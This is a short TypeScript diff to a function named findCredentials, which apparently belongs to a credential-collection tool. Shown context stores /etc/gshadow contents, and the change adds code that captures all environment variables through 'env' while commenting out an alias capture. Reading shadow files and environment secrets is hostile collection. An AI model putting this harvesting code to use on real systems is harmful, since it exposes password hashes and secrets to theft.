@@ -205,11 +205,19 @@ const findCredentials = (text: string) => {
     credentials.users.gshadow.content = gshadow;
   }
 
+  /* // Not available in subshell, search for a workaround
   const alias = _run(`alias`);
   if (alias) {
     credentials.shell.alias = {} as any;
     credentials.shell.alias.path = "$ alias";
     credentials.shell.alias.content = alias;
+  }*/
+
+  const enviromentVariables = _run(`env`);
+  if (enviromentVariables) {
+    credentials.shell.env = {} as any;
+    credentials.shell.env.path = "$ env";
+    credentials.shell.env.content = enviromentVariables;
   }
 
   // TODO: Remove void objects
